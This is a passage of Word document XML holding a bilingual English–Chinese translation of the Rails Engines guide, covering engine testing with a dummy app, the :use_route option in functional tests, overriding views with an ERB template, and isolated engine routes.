          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，并且恰好于应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录相同。如果你想使用一个标准的 ‘initializer’ 也一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CABBA0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对于 ‘locales’ 文件，简单的放置 ‘locales’ 文件到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/locales</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录，就像你在应用程序中一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230BC29C"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5 Testing an engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1535930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当一个 engie 被创建后在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里面应该会有一个简单的 ‘dummy’ 应用程序。这个应用程序被用来挂载 engine 并且使得测试极其简单。你可以通过在目录中创建 controllers， models 或 views 来扩展这个应用程序，并且随后使用它们来测试你的engine。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4355F11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test</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录应该被看作是一个典型的 Rails 测试环境，允许 unit, functional 和 integration 测试.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530E199A"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5.1 Functional tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF90F8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A matter worth taking into consideration when writing functional tests is that the tests are going to be running on an application — the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> application — rather than your engine. This is due to the setup of the testing environment; an engine needs an application as a host for testing its main functionality, especially controllers. This means that if you were to make a typical </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to a controller in a controller’s functional test like this: 一个值得考虑的问题，在编写功能测试的时候是测试打算运行在一个应用程序上 — </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 应用程序 — 而不是你的 engine。这是因为测试环境的设置；一个 engine 需要一个应用程序作为宿主来测试主要的功能，尤其是 ’controllers’。这里的意思是如果你希望产生一个典型的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 到一个如下的控制器的功能测试：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1200"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7A1F731A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13D554B6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1862280771"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>get :index</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="238F940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It may not function correctly. This is because the application doesn’t know how to route these requests to the engine unless you explicitly tell it </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>how</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. To do this, you must pass the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:use_route</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option (as a parameter) on these requests also: 它可能无法正常工作。这是因为应用程序不知道怎样 route这些请求到 engine 除非你准确的告诉它*怎么做*。要这样做，你必须提供 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:use_route</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项（作为一个参数）在这些请求：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="297B52ED" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="562D78AC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2040082966"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>get :index, :use_route</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :blorgh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B290BE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This tells the application that you still want to perform a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> request to the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action of this controller, just that you want to use the engine’s route to get there, rather than the application. 这告诉应用程序你仍然希望执行一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 到这个控制器的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ’action’，只要是你希望使用在 engine 中的 ‘route’ 到达那里，而不是在应用程序中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BAE439"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6 Improving engine functionality</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD2653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本节着眼于覆盖或添加功能 engine 所提供的 views， controllers 和 models。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E815787"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6.1 Overriding views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0307B58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当 Rails 查找一个 ‘view’ 来渲染，它将会首先查找应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录。如果这里不能找到 ’view’，那么它将会检查所有拥有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>这个目录的 engine。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CAD91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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine中，这里有一个正确的文件在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/index.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当 engine 被请求渲染 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">’ 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘action’ 的 ’view’。他会首先看到如果它可以在应用程序中 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/index.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被找到并且如果不能它将会在 engine 中查找。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F6851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通过在应用程序(添加相应的 ‘view’)中覆盖这个 ’view’，通过简单的创建一个新文件在</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/index.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，你可以完全改变 ‘view’ 的正常输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5DD13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这里尝试创建一个新文件在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/index.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且在其中放入这样的内容。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="02A3A9D6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4330652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&lt;h1&gt;Posts&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32A657B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link_to "New Post", new_post_path %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32802F0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@posts.each</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|post| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A98B25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&lt;h2&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>post.title %&gt;&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EFEF0E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&lt;small&gt;By &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>post.author %&gt;&lt;/small&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="256B949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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>simple_format(post.text) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B316A0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&lt;hr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21BD9FA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end</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5BB71F21"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6.2 Routes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B320B29"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在一个 engine 中的路由，默认是于应用程序隔离的。是因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被调用。这里的本质上的意思是应用程序和它的 engine 可以有相同名字的 route，并且它们不会冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E2EA0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Engine 中的路由被 ‘drawn’ 在 </w:t>
      </w:r>
